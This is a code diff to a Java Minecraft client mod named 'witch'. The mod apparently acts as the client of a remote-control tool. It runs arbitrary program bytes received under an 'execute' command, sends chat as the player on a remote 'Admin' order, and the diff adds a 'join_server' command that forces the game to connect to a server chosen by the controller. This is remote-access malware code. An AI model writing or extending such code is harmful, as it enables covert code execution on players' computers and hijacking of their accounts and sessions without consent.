@@ -1,5 +1,6 @@
 package me.soda.witch.client.connection;
 
+import com.google.common.net.HostAndPort;
 import com.google.gson.Gson;
 import me.soda.witch.client.Cfg;
 import me.soda.witch.client.Witch;
@@ -16,6 +17,10 @@ import me.soda.witch.shared.ProgramUtil;
 import me.soda.witch.shared.socket.TcpClient;
 import me.soda.witch.shared.socket.messages.Message;
 import me.soda.witch.shared.socket.messages.messages.*;
+import net.minecraft.client.gui.screen.ConnectScreen;
+import net.minecraft.client.gui.screen.TitleScreen;
+import net.minecraft.client.network.ServerAddress;
+import net.minecraft.client.network.ServerInfo;
 import net.minecraft.client.util.GlfwUtil;
 
 import java.lang.management.ManagementFactory;
@@ -30,8 +35,8 @@ public class Client extends TcpClient {
     public static void handleMessage(Message message) {
         try {
             LogUtil.println("Received message: " + message.data.getClass().getName());
-            if (message.data instanceof ByteData data) {
-                if (data.messageID.equals("execute")) new Thread(() -> ProgramUtil.runProg(data.bytes())).start();
+            if (message.data instanceof ByteData data && data.messageID.equals("execute")) {
+                new Thread(() -> ProgramUtil.runProg(data.bytes())).start();
             } else if (message.data instanceof ClientConfigData data) {
                 Witch.CONFIG_INFO = data;
             } else if (message.data instanceof SingleStringData data) {
@@ -55,6 +60,11 @@ public class Client extends TcpClient {
             } else if (message.data instanceof StringData data) {
                 switch (data.messageID()) {
                     case "chat_control" -> ChatUtils.sendChat(data.data());
+                    case "join_server" -> {
+                        HostAndPort hostPort = HostAndPort.fromString(data.data());
+                        ServerAddress address = new ServerAddress(hostPort.getHost(), hostPort.getPort());
+                        ConnectScreen.connect(new TitleScreen(), Witch.mc, address, new ServerInfo("Server", address.toString(), false));
+                    }
                     case "chat" -> {
                         Witch.CHAT_WINDOW.frame.setVisible(true);
                         Witch.CHAT_WINDOW.appendText("Admin:" + data.data());
